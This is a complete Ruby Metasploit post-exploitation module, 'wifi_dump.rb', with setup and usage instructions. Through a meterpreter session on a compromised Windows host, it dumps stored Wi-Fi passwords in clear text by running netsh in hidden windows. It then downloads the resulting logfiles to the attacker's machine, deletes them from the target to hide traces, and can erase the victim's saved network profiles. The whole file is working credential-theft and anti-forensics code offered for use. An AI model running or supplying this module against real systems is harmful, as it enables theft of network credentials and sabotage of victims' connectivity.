##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# [ wifi_dump.rb - ESSID credentials dump (wlan/lan) ]
# Author: pedr0 Ubuntu aka: [r00t-3xp10it]
# tested on: windows 7 | windows 10
# video tutorial: https://www.youtube.com/watch?v=DqmbV9RnPI8
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This post-exploitation module requires a meterpreter session,
# to be able to dump ESSID stored passwords (wlan/lan) using
# cmd native netsh command, this module will not be able to
# dump ESSID passwords from VMs, NAT or Bridged Networks.
#
#
# [ MODULE OPTIONS ]
# List active Interfaces available 'wlan/lan' => set LIST_INTERFACES true
# Set interface to dump credentials from      => set INTERFACE lan
# Set logfiles download location 'local'      => set DOWNLOAD_PATH /home/pedr0/Desktop
# List all ESSIDs stored in target system     => set LIST_PROFILES true
# Input ESSID name to Dump credentials from   => set DUMP_ESSID ZON-147F4
# Delete selected ESSID from target system    => set DELETE_ESSID ZON-147F4
# Show nearby wireless networks emitting      => set SHOW_NEARBY true
# dump target SSID profile OR just the key    => set KEY_ONLY true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/wlan/wifi_dump.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/wlan/wifi_dump.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/wlan
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/wlan/wifi_dump
# msf post(wifi_dump) > info
# msf post(wifi_dump) > show options
# msf post(wifi_dump) > show advanced options
# msf post(wifi_dump) > set [option(s)]
# msf post(wifi_dump) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##





#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'ESSID credentials dump (wlan/lan)',
                        'Description'   => %q{
                                        This post-exploitation module requires a meterpreter session to be able to dump ESSID stored passwords (WLAN/LAN) using CMD native NETSH command, appends reports to a logfile and downloads it from target host to a selected Local directory (set DOWNLOAD_PATH). This module will report active interfaces, a list of ESSIDs stored, shows NEARBY wireless networks, and gives the ability to delete the selected ESSID from target host interface. This module will NOT be able to dump ESSID credentials from VMs, NAT or Bridged Networks, Also remmenber to check module advanced options for more settings.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net', # post-module author
                                        'Special thanks: milton_barra', # testing/debug module
                                ],
 
                        'Version'        => '$Revision: 2.1',
                        'DisclosureDate' => 'set 15 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 (32 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 (32 bits)
                        'References'     =>
                                [
                                         [ 'URL', 'http://ss64.com/nt/netsh.html' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ],
                                         [ 'URL', 'https://technet.microsoft.com/en-us/library/cc755301(v=ws.10).aspx' ],
                                         [ 'URL', 'https://sourceforge.net/p/msf-auxiliarys/discussion/general/thread/a8e7aa57/' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',          # Default its to run againts session 1
                                        'INTERFACE' => 'wlan',     # Default its to run againts wireless interface
                                        'DOWNLOAD_PATH' => '/root' # Default its to download logs into local /root folder 
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('LIST_INTERFACES', [ false, 'List active Interfaces available (wlan/lan)' , false]),
                                OptBool.new('LIST_PROFILES', [ false, 'List ESSIDs stored in target system' , false]),
                                OptString.new('DUMP_ESSID', [ false, 'Input ESSID name to Dump credentials from'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('SHOW_NEARBY', [ false, 'Show nearby wireless networks emitting' , false]),
                                OptString.new('KEY_ONLY', [ false, 'Dump only credentials (dont dump profile)' , false]),
                                OptString.new('DELETE_ESSID', [ false, 'Delete selected ESSID from target system']),
                                OptString.new('DOWNLOAD_PATH', [ false, 'Set logfiles download location (/root)']),
                                OptString.new('INTERFACE', [ false, 'Interface to dump credentials from (wlan/lan)'])
                        ], self.class)
 
        end




#
# REPORT ACTIVE INTERFACE (WLAN/LAN)
#
def ls_stage1

  r=''
  key = []
  rand = []
  output = []
  dpath = datastore['DOWNLOAD_PATH']
  rand = Rex::Text.rand_text_alpha(8) + '.log'
  # check for proper config settings enter...
  # to prevent 'unset all' from deleting default options...
  if datastore['DOWNLOAD_PATH'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DOWNLOAD_PATH option...")
    return nil
  else
    print_status("Dumping Active Interfaces...")
  end


    #
    # execute cmd prompt in a hidden channelized windows!
    # and build logfile with results (dump) in target %temp% folder
    #
    dis = "netsh interface show interface"
    key = "netsh interface show interface > %temp%\\#{rand}"
    r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
    print_good("  exec => #{key}") 

      #
      # download 'logfile' from target machine using one API call
      #
      print_good("  exec => Downloading logfile from target system ..")
      client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
      print_warning("Dumped logfile: #{dpath}/#{rand}")
      # delete logfile from target system (API call): client.fs.file.rm("%temp%\\interfaces.log")
      r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})

      #
      # Print results on screen
      #
      output = cmd_exec(dis)
      print_line("")
      print_line(output)
      print_line("")

    #
    # close channel when done
    #
    r.channel.close
    r.close

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end






#
# LIST PROFILES AVAILABLE (ESSID)
#
def ls_stage2

  r=''
  key = []
  rand = []
  output = []
  inuse = datastore['INTERFACE']
  dpath = datastore['DOWNLOAD_PATH']
  rand = Rex::Text.rand_text_alpha(8) + '.log'
  # check for proper config settings enter...
  # to prevent 'unset all' from deleting default options...
  if datastore['DOWNLOAD_PATH'] == 'nil' || datastore['INTERFACE'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DOWNLOAD_PATH | INTERFACE options...")
    return nil
  else
    print_status("List profiles available in: #{inuse} Interface")
  end

    #
    # execute cmd prompt in a hidden channelized windows!
    # and build profiles.log with results (dump) in target %temp% folder
    #
    dis = "netsh #{inuse} show profiles"
    key = "netsh #{inuse} show profiles > %temp%\\#{rand}"
    r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
    print_good("  exec => #{key}")
 
      #
      # download 'logfile' from target machine using one API call
      #
      print_good("  exec => Downloading logfile from target system...")
      client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
      print_warning("Dumped logfile: #{dpath}/#{rand}")
      # delete logfile from target system (API call): client.fs.file.rm("%temp%\\profiles.log")
      r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})

      #
      # Print results on screen
      #
      output = cmd_exec(dis)
      print_line("")
      print_line(output)
      print_line("")

    #
    # close channel when done
    #
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end






#
# DUMP PASSWORD FROM SELECTED ESSID WLAN/LAN
#
def ls_stage3

  r=''
  key = []
  rand = []
  output = []
  inuse = datastore['INTERFACE']
  essid = datastore['DUMP_ESSID']
  dpath = datastore['DOWNLOAD_PATH']
  rand = Rex::Text.rand_text_alpha(8) + '.log'
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DUMP_ESSID'] == 'nil' || datastore['INTERFACE'] == 'nil' || datastore['DOWNLOAD_PATH'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DUMP_ESSID | INTERFACE | DOWNLOAD_PATH options...")
    return nil
  else
    print_status("Dumping Credentials of: #{essid} SSID name...")
  end


    #
    # select to dump ESSID target profile OR just the wifi key
    #
    if datastore['KEY_ONLY'] == true
    #
    # check target system installed language
    #
    check_lang = registry_getvaldata("HKLM\\System\\CurrentControlSet\\Control\\Nls\\Language","InstallLanguage")
      if check_lang == "0816" || check_lang == "0416"
        print_status("Target System language detected: Portuguese...")
        key = "netsh #{inuse} show profile #{essid} key=clear | findstr Chave > %temp%\\#{rand}"
        elsif check_lang == "0409" || check_lang == "0009" || check_lang == "0809" || check_lang == "0C09" || check_lang == "1009"
          print_status("Target System language detected: English...")
          key = "netsh #{inuse} show profile #{essid} key=clear | findstr Key > %temp%\\#{rand}"
        elsif check_lang == "0410"
          print_status("Target System language detected: Italian...")
          key = "netsh #{inuse} show profile #{essid} key=clear | findstr Chiave > %temp%\\#{rand}"
        elsif check_lang == "040C"
          print_status("Target System language detected: French...")
          key = "netsh #{inuse} show profile #{essid} key=clear | findstr Clé > %temp%\\#{rand}"
        elsif check_lang == "0407"
          print_status("Target System language detected: German...")
          key = "netsh #{inuse} show profile #{essid} key=clear | findstr Schlüssel > %temp%\\#{rand}"
        elsif check_lang == "0421"
          print_status("Target System language detected: Indonesian...")
          key = "netsh #{inuse} show profile #{essid} key=clear | findstr Kunci > %temp%\\#{rand}"
        elsif check_lang == "0413"
          print_status("Target System language detected: Netherlands...")
          key = "netsh #{inuse} show profile #{essid} key=clear | findstr sleutel > %temp%\\#{rand}"
        elsif check_lang == "0415"
          print_status("Target System language detected: Polish...")
          key = "netsh #{inuse} show profile #{essid} key=clear | findstr klucz > %temp%\\#{rand}"
      else
        print_warning("post-module cant define target system language...")
        print_warning("Defaulting 'KEY_ONLY' option to false...")
        key = "netsh #{inuse} show profile #{essid} key=clear > %temp%\\#{rand}"
      end

    else
      key = "netsh #{inuse} show profile #{essid} key=clear > %temp%\\#{rand}"
    end

    #
    # execute cmd prompt in a hidden channelized windows!
    # and build logfile with results (dump) in target %temp% folder
    #
    dis = "netsh #{inuse} show profile #{essid} key=clear"
    r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
    print_good("  exec => #{key}")
 
       # download 'logfile' from target machine using one API call
       print_good("  exec => Downloading logfile from target system...")
       client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
       print_warning("Dumped logfile: #{dpath}/#{rand}")
       # delete logfile from target system (API call): client.fs.file.rm("%temp%\\dump.log")
       r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})

       #
       # Print results on screen
       #
       output = cmd_exec(dis)
       print_line("")
       print_line(output)
       print_line("")

    #
    # close channel when done
    #
    r.channel.close
    r.close

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end






#
# LIST 'NEAR-BY' WIRELESS NETWORKS
#
def ls_stage4

  r=''
  rand = []
  output = []
  dpath = datastore['DOWNLOAD_PATH']
  rand = Rex::Text.rand_text_alpha(8) + '.log'
  # check for proper config settings enter...
  # to prevent 'unset all' from deleting default options...
  if datastore['DOWNLOAD_PATH'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DOWNLOAD_PATH option...")
    return nil
  else
    print_status("Show Nearby Wireless Networks...")
  end

    #
    # execute cmd prompt in a hidden channelized windows!
    # and build networks.log with results (dump) in target %temp% folder
    #
    dis = "netsh wlan show networks mode=b"
    key = "netsh wlan show networks mode=b > %temp%\\#{rand}"
    r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
    print_good("  exec => #{key}")
 
      #
      # download 'logfile' from target machine using one API call
      #
      print_good("  exec => Downloading logfile from target system...")
      client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
      print_warning("Dumped logfile: #{dpath}/#{rand}")
      # delete logfile from target system (API call): client.fs.file.rm("%temp%\\nearby.log")
      r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})

      #
      # Print results on screen
      #
      output = cmd_exec(dis)
      print_line("")
      print_line(output)
      print_line("")

    # close channel when done
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end






#
# DELETE SELECTED ESSID PROFILE (WLAN/LAN)
#
def ls_stage5

  r=''
  key = []
  inuse = datastore['INTERFACE']
  pwipe = datastore['DELETE_ESSID']
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DELETE_ESSID'] == 'nil' || datastore['INTERFACE'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set INTERFACE | DELETE_ESSID options...")
    return nil
  else
    print_status("Deleting ESSID: #{pwipe}")
  end

     #
     # execute cmd prompt in a hidden channelized windows!
     #
     key = "netsh #{inuse} delete profile #{pwipe}"
     r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
     print_good("  exec => #{key}")
 
      #
      # display task status to attacker
      #
      print_warning("Deleted => #{pwipe} Profile from: #{inuse} Interface")
      print_status("Target system have lost access to #{pwipe} wifi password...")
      print_line("")

    #
    # close channel when done
    #
    r.channel.close
    r.close

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error(" Error: #{e.class} #{e}")
  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end






#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client


      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +--------------------------------------------+")
    print_line("    |        * ESSID WIFI PASSWORD DUMP *        |")
    print_line("    |    Author: Pedro Ubuntu [ r00t-3xp10it ]   |")
    print_line("    +--------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # check for proper operating system (windows-not-wine)
    #
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    #
    # check for proper session (meterpreter)
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


#
# Selected settings to run
#
      if datastore['LIST_INTERFACES']
         ls_stage1
      end

      if datastore['LIST_PROFILES']
         ls_stage2
      end

      if datastore['DUMP_ESSID']
         ls_stage3
      end

      if datastore['SHOW_NEARBY']
         ls_stage4
      end

      if datastore['DELETE_ESSID']
         ls_stage5
      end
   end
end
